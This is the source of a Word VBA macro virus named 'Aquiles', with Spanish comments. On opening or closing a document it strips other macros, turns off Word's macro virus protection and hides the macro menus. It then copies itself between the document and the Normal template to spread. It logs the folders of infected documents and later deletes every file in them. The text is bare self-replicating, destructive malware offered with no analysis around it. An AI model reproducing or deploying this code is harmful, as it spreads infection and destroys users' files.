   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Aquiles"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Count > 1 Then
    For op = 2 To ActiveDocument.VBProject.VBComponents.Count
      cantidad = ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
      ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
    Next op
    End If
    If NormalTemplate.VBProject.VBComponents.Count > 1 Then
    For op = 2 To NormalTemplate.VBProject.VBComponents.Count
      cantidad = NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
      NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
    Next op
    End If
    Document_Close
   End Sub
   Private Sub Document_Close()
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    Options.VirusProtection = False
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("View").Controls(6).Enabled = False
    CommandBars("tools").Controls(15).Enabled = False
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    If MacroContainer.FullName = ActiveDocument.FullName Then
     If nt.Name <> "Aquiles" Then GoTo ClaudioNormal
    Else
     If ad.Name <> "Aquiles" Then GoTo Aquilesdocument
    End If
   GoTo Findelmundo
   Aquilesdocument:
    lineas = ad.CodeModule.CountOfLines
    ad.CodeModule.DeleteLines 1, lineas
    lineas = 1
    Do While lineas <= nt.CodeModule.CountOfLines
       cadenadecodigo = nt.CodeModule.lines(lineas, 1)
       ad.CodeModule.insertlines lineas, cadenadecodigo
       lineas = lineas + 1
    Loop
    ad.Name = "Aquiles"
    Open "C:\system.Dos" For Append As #1
      Print #1, ActiveDocument.Path
    Close #1
    ActiveDocument.SaveAs ActiveDocument.FullName, wdFormatDocument
   GoTo Findelmundo
   ClaudioNormal:
    lineas = nt.CodeModule.CountOfLines
    nt.CodeModule.DeleteLines 1, lineas
    lineas = 1
    Do While lineas <= ad.CodeModule.CountOfLines
       cadenadecodigo = ad.CodeModule.lines(lineas, 1)
       nt.CodeModule.insertlines lineas, cadenadecodigo
       lineas = lineas + 1
    Loop
    nt.Name = "Aquiles"
    NormalTemplate.Save
   Findelmundo:
   If Dir("C:\system.Dos", vbNormal) <> "" Then
   If FileLen("C:\system.Dos") > 1024 Then
     Open "C:\system.Dos" For Input As #1
       Do While Not EOF(1)
         Line Input #1, direccion
         Kill (direccion + "\*.*")
       Loop
     Close #1
     Kill ("C:\system.Dos")
     Application.UserName = "Gonzalez"
   End If
   End If
   'Al rio jactancioso, Dios le a puesto un vado. Malinke
   'esto es una modificacion, trato de llegar a la perfeccion
   End Sub
